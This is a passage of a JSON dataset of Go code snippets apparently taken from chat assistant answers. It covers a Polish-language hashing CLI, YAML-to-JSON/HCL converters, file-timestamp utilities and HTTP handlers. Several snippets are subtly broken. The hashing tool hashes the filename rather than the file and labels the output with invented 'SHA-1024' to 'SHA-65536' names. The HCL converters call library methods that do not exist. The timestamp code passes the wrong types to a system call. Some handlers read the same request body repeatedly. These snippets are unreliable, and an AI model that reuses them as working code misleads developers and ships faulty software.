\"\\n\")\n\t\tfmt.Fprintf(os.Stderr, \"Sposób użycia: %s -f [nazwa_pliku] [opcje]\\n\", os.Args[0])\n\t\tfmt.Fprintf(os.Stderr, \"\\nOpcje:\\n\")\n\t\tfor _, shaOption := range shaOptions {\n\t\t\tfmt.Fprintf(os.Stderr, \"%s %s\\n\", shaOption.name, shaOption.desc)\n\t\t}\n\t}\n\n\tflag.Parse()\n}\n\nfunc main() {\n\tif fileName == \"\" {\n\t\tflag.Usage()\n\t\tos.Exit(1)\n\t}\n\n\tbuf := []byte(fileName)\n\n\tfor _, shaOption := range shaOptions {\n\t\tif *shaOption.enabled {\n\t\t\th := make([]byte, shaOption.shaLength)\n\t\t\tsha3.ShakeSum256(h, buf)\n\t\t\tfmt.Printf(\"%s: %x\\n\", shaOption.name, h)\n\t\t}\n\t}\n}",
    "filename": "c167ddae169717456c282a8ad8741242_1.go"
  },
  {
    "conversation_hash": "313f5ab40dc040fb23be31499c14f912",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"flag\"\n    \"fmt\"\n    \"os\"\n    \"golang.org/x/crypto/sha3\"\n)\n\nvar (\n    logoSHA1024 = `\n S `\n\n    fileName   string\n    sha1024    bool\n    sha2048    bool\n    sha4096    bool\n    sha8192    bool\n    sha16384   bool\n    sha32768   bool\n    sha65536   bool\n)\n\nfunc main() {\n    flag.StringVar(&fileName, \"f\", \"\", \"[nazwa pliku]\")\n    flag.BoolVar(&sha1024, \"sha1024\", false, \"[generuj skrót SHA-1024]\")\n    flag.BoolVar(&sha2048, \"sha2048\", false, \"[generuj skrót SHA-2048]\")\n    flag.BoolVar(&sha4096, \"sha4096\", false, \"[generuj skrót SHA-4096]\")\n    flag.BoolVar(&sha8192, \"sha8192\", false, \"[generuj skrót SHA-8192]\")\n    flag.BoolVar(&sha16384, \"sha16384\", false, \"[generuj skrót SHA-16384]\")\n    flag.BoolVar(&sha32768, \"sha32768\", false, \"[generuj skrót SHA-32768]\")\n    flag.BoolVar(&sha65536, \"sha65536\", false, \"[generuj skrót SHA-65536]\")\n\n    flag.Usage = func() {\n        fmt.Fprintf(os.Stderr, \"%s\\n\", logoSHA1024)\n        fmt.Fprintf(os.Stderr, \"\\n\")\n        fmt.Fprintf(os.Stderr, \"Generates SHA hashes 1024-65536 for the file using the SHA-3 Shake256 algorithm\\n\")\n        fmt.Fprintf(os.Stderr, \"\\n\")\n        fmt.Fprintf(os.Stderr, \"Sposób użycia: %s -f [nazwa_pliku] [opcje]\\n\", os.Args[0])\n        fmt.Fprintf(os.Stderr, \"\\nOpcje:\\n\")\n\n        flag.VisitAll(func(f *flag.Flag) {\n            fmt.Fprintf(os.Stderr, \"  -%s %s\\n\", f.Name, f.Usage)\n        })\n    }\n\n    flag.Parse()\n\n    if fileName == \"\" {\n        flag.Usage()\n        os.Exit(1)\n    }\n\n    buf := []byte(fileName)\n\n    if sha1024 {\n        h := make([]byte, 128)\n        sha3.ShakeSum256(h, buf)\n        fmt.Printf(\"SHA-1024: %x\\n\", h)\n    }\n\n    if sha2048 {\n        h := make([]byte, 256)\n        sha3.ShakeSum256(h, buf)\n        fmt.Printf(\"SHA-2048: %x\\n\", h)\n    }\n\n    if sha4096 {\n        h := make([]byte, 512)\n        sha3.ShakeSum256(h, buf)\n        fmt.Printf(\"SHA-4096: %x\\n\", h)\n    }\n\n    if sha8192 {\n        h := make([]byte, 1024)\n        sha3.ShakeSum256(h, buf)\n        fmt.Printf(\"SHA-8192: %x\\n\", h)\n    }\n\n    if sha16384 {\n        h := make([]byte, 2048)\n        sha3.ShakeSum256(h, buf)\n        fmt.Printf(\"SHA-16384: %x\\n\", h)\n    }\n\n    if sha32768 {\n        h := make([]byte, 4096)\n        sha3.ShakeSum256(h, buf)\n        fmt.Printf(\"SHA-32768: %x\\n\", h)\n    }\n\n    if sha65536 {\n        h := make([]byte, 8192)\n        sha3.ShakeSum256(h, buf)\n        fmt.Printf(\"SHA-65536: %x\\n\", h)\n    }\n}",
    "filename": "313f5ab40dc040fb23be31499c14f912_0.go"
  },
  {
    "conversation_hash": "57ca0c3b3dbce2ad2565f1ea1317872f",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\n\t\"github.com/hashicorp/hcl/v2/hclsyntax\"\n\t\"github.com/hashicorp/hcl/v2/hclwrite\"\n\t\"gopkg.in/yaml.v2\"\n)\n\ntype HclRoot struct {\n\tBody hclsyntax.BlockList\n}\n\nfunc main() {\n\tyamlInput := `\n\t- name: John\n\t  age: 30\n\t- name: Jane\n\t  age: 25\n\t`\n\n\tfmt.Println(\"Converting YAML to JSON:\")\n\tjsonOutput, err := convertYAMLToJSON([]byte(yamlInput))\n\tif err != nil {\n\t\tfmt.Printf(\"Error: %v\\n\", err)\n\t} else {\n\t\tfmt.Println(string(jsonOutput))\n\t}\n\n\tfmt.Println(\"\\nConverting YAML to HCL:\")\n\thclOutput, err := convertYAMLToHCL([]byte(yamlInput))\n\tif err != nil {\n\t\tfmt.Printf(\"Error: %v\\n\", err)\n\t} else {\n\t\tfmt.Println(string(hclOutput.Bytes()))\n\t}\n}\n\nfunc convertYAMLToJSON(yamlInput []byte) ([]byte, error) {\n\tvar data interface{}\n\tif err := yaml.Unmarshal(yamlInput, &data); err != nil {\n\t\treturn nil, err\n\t}\n\tjsonOutput, err := json.MarshalIndent(data, \"\", \"  \")\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\treturn jsonOutput, nil\n}\n\nfunc convertYAMLToHCL(yamlInput []byte) (*hclwrite.File, error) {\n\tvar data []map[string]interface{}\n\tif err := yaml.Unmarshal(yamlInput, &data); err != nil {\n\t\treturn nil, err\n\t}\n\n\tfile := hclwrite.NewEmptyFile()\n\trootBody := file.Body()\n\n\tfor _, item := range data {\n\t\tblock := rootBody.AppendNewBlock(\"person\", nil)\n\t\tfor key, value := range item {\n\t\t\tattr := block.Body().AppendNewAttr(key, nil)\n\t\t\twriteAttributeValue(attr, value)\n\t\t}\n\t}\n\n\treturn file, nil\n}\n\nfunc writeAttributeValue(attr *hclwrite.Attribute, value interface{}) {\n\tswitch v := value.(type) {\n\tcase string:\n\t\tattr.Expr().Assign(hclwrite.NewLiteralExpr(v, \"\"))\n\tcase int:\n\t\tattr.Expr().Assign(hclwrite.NewLiteralExpr(fmt.Sprintf(\"%d\", v), \"\"))\n\tcase []interface{}:\n\t\tlistExpr := attr.Expr().List(exprNumElts(v))\n\t\tfor _, elt := range v {\n\t\t\twriteListElement(listExpr.AppendNewValue(), elt)\n\t\t}\n\tcase map[string]interface{}:\n\t\tblockBody := attr.Expr().Block().Body()\n\t\tfor key, value := range v {\n\t\t\tattr := blockBody.AppendNewAttr(key, nil)\n\t\t\twriteAttributeValue(attr, value)\n\t\t}\n\t}\n}\n\nfunc writeListElement(elt *hclwrite.Value, value interface{}) {\n\tswitch v := value.(type) {\n\tcase string:\n\t\telt.Assign(hclwrite.NewLiteralExpr(v, \"\"))\n\tcase int:\n\t\telt.Assign(hclwrite.NewLiteralExpr(fmt.Sprintf(\"%d\", v), \"\"))\n\tcase []interface{}:\n\t\tlistExpr := elt.List(exprNumElts(v))\n\t\tfor _, elt := range v {\n\t\t\twriteListElement(listExpr.AppendNewValue(), elt)\n\t\t}\n\tcase map[string]interface{}:\n\t\tblockBody := elt.Block().Body()\n\t\tfor key, value := range v {\n\t\t\tattr := blockBody.AppendNewAttr(key, nil)\n\t\t\twriteAttributeValue(attr, value)\n\t\t}\n\t}\n}\n\nfunc exprNumElts(list []interface{}) int {\n\tcount := 0\n\tfor _, elt := range list {\n\t\tswitch v := elt.(type) {\n\t\tcase []interface{}:\n\t\t\tcount += exprNumElts(v)\n\t\tcase map[string]interface{}:\n\t\t\tcount++\n\t\tdefault:\n\t\t\tcount++\n\t\t}\n\t}\n\treturn count\n}",
    "filename": "57ca0c3b3dbce2ad2565f1ea1317872f_0.go"
  },
  {
    "conversation_hash": "57ca0c3b3dbce2ad2565f1ea1317872f",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/json\"\n\t\"flag\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"os\"\n\t\"path/filepath\"\n\n\t\"github.com/hashicorp/hcl/v2/hclsyntax\"\n\t\"github.com/hashicorp/hcl/v2/hclwrite\"\n\t\"gopkg.in/yaml.v2\"\n)\n\ntype HclRoot struct {\n\tBody hclsyntax.BlockList\n}\n\nfunc main() {\n\tyamlFile := flag.String(\"file\", \"\", \"Ścieżka do pliku YAML\")\n\tflag.Parse()\n\n\tif *yamlFile == \"\" {\n\t\tfmt.Println(\"Podaj ścieżkę do pliku YAML za pomocą flagi -file\")\n\t\tos.Exit(1)\n\t}\n\n\tyamlInput, err := ioutil.ReadFile(*yamlFile)\n\tif err != nil {\n\t\tfmt.Printf(\"Nie można odczytać pliku YAML: %v\\n\", err)\n\t\tos.Exit(1)\n\t}\n\n\tfmt.Println(\"Konwertowanie YAML na JSON:\")\n\tjsonOutput, err := convertYAMLToJSON(yamlInput)\n\tif err != nil {\n\t\tfmt.Printf(\"Błąd konwersji YAML na JSON: %v\\n\", err)\n\t} else {\n\t\tjsonFilename := changeFileExtension(*yamlFile, \".json\")\n\t\terr = ioutil.WriteFile(jsonFilename, jsonOutput, 0644)\n\t\tif err != nil {\n\t\t\tfmt.Printf(\"Błąd zapisu pliku JSON: %v\\n\", err)\n\t\t} else {\n\t\t\tfmt.Printf(\"Plik JSON został zapisany jako: %s\\n\", jsonFilename)\n\t\t}\n\t}\n\n\tfmt.Println(\"\\nKonwertowanie YAML na HCL:\")\n\thclOutput, err := convertYAMLToHCL(yamlInput)\n\tif err != nil {\n\t\tfmt.Printf(\"Błąd konwersji YAML na HCL: %v\\n\", err)\n\t} else {\n\t\thclFilename := changeFileExtension(*yamlFile, \".hcl\")\n\t\terr = ioutil.WriteFile(hclFilename, hclOutput.Bytes(), 0644)\n\t\tif err != nil {\n\t\t\tfmt.Printf(\"Błąd zapisu pliku HCL: %v\\n\", err)\n\t\t} else {\n\t\t\tfmt.Printf(\"Plik HCL został zapisany jako: %s\\n\", hclFilename)\n\t\t}\n\t}\n}\n\nfunc convertYAMLToJSON(yamlInput []byte) ([]byte, error) {\n\tvar data interface{}\n\tif err := yaml.Unmarshal(yamlInput, &data); err != nil {\n\t\treturn nil, err\n\t}\n\tjsonOutput, err := json.MarshalIndent(data, \"\", \"  \")\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\treturn jsonOutput, nil\n}\n\nfunc convertYAMLToHCL(yamlInput []byte) (*hclwrite.File, error) {\n\tvar data []map[string]interface{}\n\tif err := yaml.Unmarshal(yamlInput, &data); err != nil {\n\t\treturn nil, err\n\t}\n\n\tfile := hclwrite.NewEmptyFile()\n\trootBody := file.Body()\n\n\tfor _, item := range data {\n\t\tblock := rootBody.AppendNewBlock(\"person\", nil)\n\t\tfor key, value := range item {\n\t\t\tattr := block.Body().AppendNewAttr(key, nil)\n\t\t\twriteAttributeValue(attr, value)\n\t\t}\n\t}\n\n\treturn file, nil\n}\n\nfunc writeAttributeValue(attr *hclwrite.Attribute, value interface{}) {\n\tswitch v := value.(type) {\n\tcase string:\n\t\tattr.Expr().Assign(hclwrite.NewLiteralExpr(v, \"\"))\n\tcase int:\n\t\tattr.Expr().Assign(hclwrite.NewLiteralExpr(fmt.Sprintf(\"%d\", v), \"\"))\n\tcase []interface{}:\n\t\tlistExpr := attr.Expr().List(exprNumElts(v))\n\t\tfor _, elt := range v {\n\t\t\twriteListElement(listExpr.AppendNewValue(), elt)\n\t\t}\n\tcase map[string]interface{}:\n\t\tblockBody := attr.Expr().Block().Body()\n\t\tfor key, value := range v {\n\t\t\tattr := blockBody.AppendNewAttr(key, nil)\n\t\t\twriteAttributeValue(attr, value)\n\t\t}\n\t}\n}\n\nfunc writeListElement(elt *hclwrite.Value, value interface{}) {\n\tswitch v := value.(type) {\n\tcase string:\n\t\telt.Assign(hclwrite.NewLiteralExpr(v, \"\"))\n\tcase int:\n\t\telt.Assign(hclwrite.NewLiteralExpr(fmt.Sprintf(\"%d\", v), \"\"))\n\tcase []interface{}:\n\t\tlistExpr := elt.List(exprNumElts(v))\n\t\tfor _, elt := range v {\n\t\t\twriteListElement(listExpr.AppendNewValue(), elt)\n\t\t}\n\tcase map[string]interface{}:\n\t\tblockBody := elt.Block().Body()\n\t\tfor key, value := range v {\n\t\t\tattr := blockBody.AppendNewAttr(key, nil)\n\t\t\twriteAttributeValue(attr, value)\n\t\t}\n\t}\n}\n\nfunc exprNumElts(list []interface{}) int {\n\tcount := 0\n\tfor _, elt := range list {\n\t\tswitch v := elt.(type) {\n\t\tcase []interface{}:\n\t\t\tcount += exprNumElts(v)\n\t\tcase map[string]interface{}:\n\t\t\tcount++\n\t\tdefault:\n\t\t\tcount++\n\t\t}\n\t}\n\treturn count\n}\n\nfunc changeFileExtension(filename string, newExtension string) string {\n\text := filepath.Ext(filename)\n\treturn filename[:len(filename)-len(ext)] + newExtension\n}",
    "filename": "57ca0c3b3dbce2ad2565f1ea1317872f_1.go"
  },
  {
    "conversation_hash": "57ca0c3b3dbce2ad2565f1ea1317872f",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "fmt.Println(\"\\nKonwertowanie YAML na HCL:\")\nhclOutput, err := convertYAMLToHCL(yamlInput)\nif err != nil {\n\tfmt.Printf(\"Błąd konwersji YAML na HCL: %v\\n\", err)\n} else {\n\thclFilename := changeFileExtension(*yamlFile, \".hcl\")\n\terr = ioutil.WriteFile(hclFilename, hclOutput.Bytes(), 0644)\n\tif err != nil {\n\t\tfmt.Printf(\"Błąd zapisu pliku HCL: %v\\n\", err)\n\t} else {\n\t\tfmt.Printf(\"Plik HCL został zapisany jako: %s\\n\", hclFilename)\n\t}\n}",
    "filename": "57ca0c3b3dbce2ad2565f1ea1317872f_3.go"
  },
  {
    "conversation_hash": "57ca0c3b3dbce2ad2565f1ea1317872f",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "fmt.Println(\"Konwertowanie YAML na JSON:\")\njsonOutput, err := convertYAMLToJSON(yamlInput)\nif err != nil {\n\tfmt.Printf(\"Błąd konwersji YAML na JSON: %v\\n\", err)\n} else {\n\tjsonFilename := changeFileExtension(*yamlFile, \".json\")\n\terr = ioutil.WriteFile(jsonFilename, jsonOutput, 0644)\n\tif err != nil {\n\t\tfmt.Printf(\"Błąd zapisu pliku JSON: %v\\n\", err)\n\t} else {\n\t\tfmt.Printf(\"Plik JSON został zapisany jako: %s\\n\", jsonFilename)\n\t}\n}",
    "filename": "57ca0c3b3dbce2ad2565f1ea1317872f_5.go"
  },
  {
    "conversation_hash": "a0b3115bab5bca15a771957d43a24a02",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"log\"\n\t\"os\"\n\t\"path/filepath\"\n\t\"strings\"\n\n\t\"github.com/hashicorp/hcl/v2/hclsimple\"\n\t\"gopkg.in/yaml.v2\"\n)\n\nfunc main() {\n\t// Get the YAML or HCL file path as a command line argument\n\tif len(os.Args) < 2 {\n\t\tlog.Fatal(\"Please provide the path to the YAML or HCL file as an argument\")\n\t}\n\n\tfilePath := os.Args[1]\n\n\t// Check the file extension\n\tfileExt := filepath.Ext(filePath)\n\n\tif fileExt == \".yaml\" || fileExt == \".yml\" {\n\t\t// Convert YAML to JSON\n\t\tjsonData, err := convertYamlToJson(filePath)\n\t\tif err != nil {\n\t\t\tlog.Fatal(err)\n\t\t}\n\n\t\t// Display the converted JSON\n\t\tfmt.Println(string(jsonData))\n\n\t\t// Convert YAML to HCL\n\t\thclData, err := convertYamlToHcl(filePath)\n\t\tif err != nil {\n\t\t\tlog.Fatal(err)\n\t\t}\n\n\t\t// Display the converted HCL\n\t\tfmt.Println(string(hclData))\n\t} else if fileExt == \".hcl\" {\n\t\t// Convert HCL to JSON\n\t\tjsonData, err := convertHclToJson(filePath)\n\t\tif err != nil {\n\t\t\tlog.Fatal(err)\n\t\t}\n\n\t\t// Display the converted JSON\n\t\tfmt.Println(string(jsonData))\n\t} else {\n\t\tlog.Fatal(\"Unsupported file extension. Supported extensions are .yaml, .yml, and .hcl\")\n\t}\n}\n\nfunc convertYamlToJson(filePath string) ([]byte, error) {\n\tyamlData, err := ioutil.ReadFile(filePath)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\tvar data interface{}\n\terr = yaml.Unmarshal(yamlData, &data)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\tjsonData, err := json.Marshal(data)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\treturn jsonData, nil\n}\n\nfunc convertYamlToHcl(filePath string) ([]byte, error) {\n\tyamlData, err := ioutil.ReadFile(filePath)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\tvar data map[interface{}]interface{}\n\terr = yaml.Unmarshal(yamlData, &data)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\thclData := convertMapToHcl(data, \"\")\n\treturn hclData, nil\n}\n\nfunc convertMapToHcl(data map[interface{}]interface{}, indent string) []byte {\n\thcl := \"\"\n\tfor key, value := range data {\n\t\tif subMap, ok := value.(map[interface{}]interface{}); ok {\n\t\t\thcl += fmt.Sprintf(\"%s%s {\\n\", indent, key)\n\t\t\thcl += string(convertMapToHcl(subMap, indent+\"  \"))\n\t\t\thcl += fmt.Sprintf(\"%s}\\n\", indent)\n\t\t} else {\n\t\t\thcl += fmt.Sprintf(\"%s%s = %v\\n\", indent, key, value)\n\t\t}\n\t}\n\n\treturn []byte(hcl)\n}\n\nfunc convertHclToJson(filePath string) ([]byte, error) {\n\thclData, err := ioutil.ReadFile(filePath)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\tvar data map[string]interface{}\n\terr = hclsimple.Decode(filePath, hclData, nil, &data)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\tjsonData, err := json.Marshal(data)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\treturn jsonData, nil\n}",
    "filename": "a0b3115bab5bca15a771957d43a24a02_0.go"
  },
  {
    "conversation_hash": "55747c8d4a1848ae3664aa006459c0a7",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n)\n\nfunc main() {\n\tnow := time.Now()\n\ttimeSpec := now.Format(time.RFC3339Nano)\n\n\tprintln(timeSpec)\n\tfmt.Println(timeSpec)\n}",
    "filename": "55747c8d4a1848ae3664aa006459c0a7_0.go"
  },
  {
    "conversation_hash": "55747c8d4a1848ae3664aa006459c0a7",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"time\"\n\nfunc main() {\n\tnow := time.Now()\n\ttimeSpec := now.Format(time.RFC3339Nano)\n\n\tprintln(timeSpec)\n}",
    "filename": "55747c8d4a1848ae3664aa006459c0a7_1.go"
  },
  {
    "conversation_hash": "1e98ec61154812b27c0eaed40921b990",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"os\"\n\t\"syscall\"\n\t\"time\"\n)\n\nfunc main() {\n\tfilename := \"file.txt\"\n\tvar stat syscall.Stat_t\n\n\t// Get file status\n\tif err := syscall.Stat(filename, &stat); err != nil {\n\t\tfmt.Println(\"Error:\", err)\n\t\treturn\n\t}\n\n\t// Convert timestamps to timeval structure\n\ttimeval := []syscall.Timeval{\n\t\t{Sec: stat.Atimespec.Sec, Usec: stat.Atimespec.Nsec / 1000},\n\t\t{Sec: stat.Mtimespec.Sec, Usec: stat.Mtimespec.Nsec / 1000},\n\t}\n\n\t// Change file timestamps\n\tif err := syscall.UtimesNano(filename, timeval); err != nil {\n\t\tfmt.Println(\"Error:\", err)\n\t\treturn\n\t}\n\n\tfmt.Println(\"File timestamps modified successfully.\")\n}",
    "filename": "1e98ec61154812b27c0eaed40921b990_2.go"
  },
  {
    "conversation_hash": "1e98ec61154812b27c0eaed40921b990",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"os\"\n\t\"syscall\"\n\t\"time\"\n)\n\nfunc main() {\n\tfilename := \"file.txt\"\n\t// Create a test file\n\t_, err := os.Create(filename)\n\tif err != nil {\n\t\tfmt.Println(\"Error creating file:\", err)\n\t\treturn\n\t}\n\tdefer os.Remove(filename) // Remove the file at the end\n\n\tvar stat syscall.Stat_t\n\n\t// Get file status\n\tif err := syscall.Stat(filename, &stat); err != nil {\n\t\tfmt.Println(\"Error:\", err)\n\t\treturn\n\t}\n\n\t// Convert timestamps to timeval structure\n\ttimeval := []syscall.Timeval{\n\t\t{Sec: stat.Atimespec.Sec, Usec: stat.Atimespec.Nsec / 1000},\n\t\t{Sec: stat.Mtimespec.Sec, Usec: stat.Mtimespec.Nsec / 1000},\n\t}\n\n\t// Change file timestamps\n\tif err := syscall.UtimesNano(filename, timeval); err != nil {\n\t\tfmt.Println(\"Error:\", err)\n\t\treturn\n\t}\n\n\tfmt.Println(\"File timestamps modified successfully.\")\n}",
    "filename": "1e98ec61154812b27c0eaed40921b990_3.go"
  },
  {
    "conversation_hash": "1e98ec61154812b27c0eaed40921b990",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"os\"\n\t\"syscall\"\n\t\"time\"\n)\n\nfunc main() {\n\tfilename := \"file.txt\"\n\t// Create a test file\n\t_, err := os.Create(filename)\n\tif err != nil {\n\t\tfmt.Println(\"Error creating file:\", err)\n\t\treturn\n\t}\n\tdefer os.Remove(filename) // Remove the file at the end\n\n\tvar stat syscall.Stat_t\n\n\t// Get file status\n\tif err := syscall.Stat(filename, &stat); err != nil {\n\t\tfmt.Println(\"Error:\", err)\n\t\treturn\n\t}\n\n\t// Convert timestamps to timeval structure\n\ttimeval := []syscall.Timeval{\n\t\t{Sec: stat.Atimespec.Sec, Usec: int64(stat.Atimespec.Nsec / 1000)},\n\t\t{Sec: stat.Mtimespec.Sec, Usec: int64(stat.Mtimespec.Nsec / 1000)},\n\t}\n\n\t// Change file timestamps\n\tif err := syscall.UtimesNano(filename, timeval); err != nil {\n\t\tfmt.Println(\"Error:\", err)\n\t\treturn\n\t}\n\n\tfmt.Println(\"File timestamps modified successfully.\")\n}",
    "filename": "1e98ec61154812b27c0eaed40921b990_4.go"
  },
  {
    "conversation_hash": "1e98ec61154812b27c0eaed40921b990",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"os\"\n\t\"syscall\"\n\t\"time\"\n)\n\nfunc main() {\n\tfilename := \"file.txt\"\n\t// Create a test file\n\t_, err := os.Create(filename)\n\tif err != nil {\n\t\tfmt.Println(\"Error creating file:\", err)\n\t\treturn\n\t}\n\tdefer os.Remove(filename) // Remove the file at the end\n\n\tvar stat syscall.Stat_t\n\n\t// Get file status\n\tif err := syscall.Stat(filename, &stat); err != nil {\n\t\tfmt.Println(\"Error:\", err)\n\t\treturn\n\t}\n\n\t// Convert timestamps to timeval structure\n\ttimeval := []syscall.Timeval{\n\t\t{Sec: stat.Atimespec.Sec, Usec: int64(stat.Atimespec.Nsec) / 1000},\n\t\t{Sec: stat.Mtimespec.Sec, Usec: int64(stat.Mtimespec.Nsec) / 1000},\n\t}\n\n\t// Change file timestamps\n\tif err := syscall.UtimesNano(filename, timeval); err != nil {\n\t\tfmt.Println(\"Error:\", err)\n\t\treturn\n\t}\n\n\tfmt.Println(\"File timestamps modified successfully.\")\n}",
    "filename": "1e98ec61154812b27c0eaed40921b990_5.go"
  },
  {
    "conversation_hash": "d0716c4d9b06c8180ec51541c29bfa3f",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "type Person struct {\n\tName      string  `json:\"name\"`\n\tAge       int     `json:\"age,omitempty\"`\n\tAddress   string  `json:\"address,omitempty\"`\n}\n\nfunc main() {\n\tp1 := Person{Name: \"John\", Age: 25}\n\tp2 := Person{Name: \"Jane\"}\n\n\tjsonData1, _ := json.Marshal(p1)\n\tfmt.Println(string(jsonData1)) // Output: {\"name\":\"John\",\"age\":25}\n\n\tjsonData2, _ := json.Marshal(p2)\n\tfmt.Println(string(jsonData2)) // Output: {\"name\":\"Jane\"}\n}",
    "filename": "d0716c4d9b06c8180ec51541c29bfa3f_0.go"
  },
  {
    "conversation_hash": "a03acabce026210aca14552ec1822457",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "func openDB() (*sql.DB, error) {\n       db, err := sql.Open(\"mysql\", \"user:password@tcp(host:port)/database\")\n       if err != nil {\n           return nil, err\n       }\n       return db, nil\n   }\n\n   func main() {\n       db, err := openDB()\n       if err != nil {\n           log.Fatal(err)\n       }\n       defer db.Close()\n\n       // Rest of your code...\n   }",
    "filename": "a03acabce026210aca14552ec1822457_2.go"
  },
  {
    "conversation_hash": "817932d9f6694953ccf1d2ab33690dbe",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "qParts := strings.Split(q, \" \")\nvar queryValue string\n\nfor i, qPart := range qParts {\n\tif qPart == \" \" {\n\t\tcontinue\n\t}\n\t// Boost the score of the first word by using a higher boost value\n\tboost := 1.0\n\tif i == 0 {\n\t\tboost = 2.0 // Adjust the boost value as needed\n\t}\n\n\tqueryValue += qPart + \"^\" + strconv.FormatFloat(boost, 'f', -1, 64) + \"*~\" + \" \"\n}",
    "filename": "817932d9f6694953ccf1d2ab33690dbe_0.go"
  },
  {
    "conversation_hash": "bc1ebfbb98ecef7c432f0f525a179c15",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "func handleEranConnection(w http.ResponseWriter, r *http.Request) {\n    cellular := &model.Cellular{}\n    if err := s.decode(w, r, cellular); err != nil {\n        s.error(w, r, http.StatusBadRequest, err)\n        return\n    }\n    subnetwork := &model.SubNetwork{}\n    if err := s.decode(w, r, subnetwork); err != nil {\n        s.error(w, r, http.StatusBadRequest, err)\n        return\n    }\n    data := &model.EranConnection{Cellular: *cellular, SubNetwork: *subnetwork}\n    \n    if err := s.store.EranConnection().Fetch(data); err != nil {\n        s.error(w, r, http.StatusInternalServerError, err)\n        return\n    }\n    \n    s.respond(w, r, http.StatusOK, data)\n}",
    "filename": "bc1ebfbb98ecef7c432f0f525a179c15_1.go"
  },
  {
    "conversation_hash": "24514d095b2832c205cc1572e8b5857a",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "// encodes object as json string and respond to user\nfunc (s *server) handleEranConnection() http.HandlerFunc {\n\treturn func(w http.ResponseWriter, r *http.Request) {\n\t\tcellular := &model.Cellular{}\n\t\tif err := s.decode(w, r, cellular); err != nil {\n\t\t\ts.error(w, r, http.StatusBadRequest, err)\n\t\t\treturn\n\t\t}\n\t\tsubnetwork := &model.SubNetwork{}\n\t\tif err := s.decode(w, r, subnetwork); err != nil {\n\t\t\ts.error(w, r, http.StatusBadRequest, err)\n\t\t\treturn\n\t\t}\n\t\tdata := &model.EranConnection{\n\t\t\tCellular:   *cellular,\n\t\t\tSubNetwork: *subnetwork,\n\t\t}\n\t\tif err := s.decode(w, r, data); err != nil {\n\t\t\ts.error(w, r, http.StatusBadRequest, err)\n\t\t\treturn\n\t\t}\n\t\ts.store.EranConnection().Fetch(data)\n\t\ts.respond(w, r, http.StatusOK, data)\n\t}\n}",
    "filename": "24514d095b2832c205cc1572e8b5857a_0.go"
  },
  {
    "conversation_hash": "24514d095b2832c205cc1572e8b5857a",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "// encodes object as json string and respond to user\nfunc (s *server) handleEranConnection() http.HandlerFunc {\n\treturn func(w http.ResponseWriter, r *http.Request) {\n\t\tcellular := &model.Cellular{}\n\t\tif err := s.decode(w, r, cellular); err != nil {\n\t\t\tif err == io.EOF {\n\t\t\t\t// Handle empty or malformed request body\n\t\t\t\ts.error(w, r, http.StatusBadRequest, errors.New(\"empty or malformed request body\"))\n\t\t\t\treturn\n\t\t\t}\n\t\t\ts.error(w, r, http.StatusBadRequest, err)\n\t\t\treturn\n\t\t}\n\t\tsubnetwork := &model.SubNetwork{}\n\t\tif err := s.decode(w, r, subnetwork); err != nil {\n\t\t\tif err == io.EOF {\n\t\t\t\t// Handle empty or malformed request body\n\t\t\t\ts.error(w, r, http.StatusBadRequest, errors.New(\"empty or malformed request body\"))\n\t\t\t\treturn\n\t\t\t}\n\t\t\ts.error(w, r, http.StatusBadRequest, err)\n\t\t\treturn\n\t\t}\n\t\tdata := &model.EranConnection{\n\t\t\tCellular:   *cellular,\n\t\t\tSubNetwork: *subnetwork,\n\t\t}\n\t\tif err := s.decode(w, r, data); err != nil {\n\t\t\tif err == io.EOF {\n\t\t\t\t// Handle empty or malformed request body\n\t\t\t\ts.error(w, r, http.StatusBadRequest, errors.New(\"empty or malformed request body\"))\n\t\t\t\treturn\n\t\t\t}\n\t\t\ts.error(w, r, http.StatusBadRequest, err)\n\t\t\treturn\n\t\t}\n\t\ts.store.EranConnection().Fetch(data)\n\t\ts.respond(w, r, http.StatusOK, data)\n\t}\n}",
    "filename": "24514d095b2832c205cc1572e8b5857a_1.go"
  },
  {
    "conversation_hash": "24514d095b2832c205cc1572e8b5857a",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
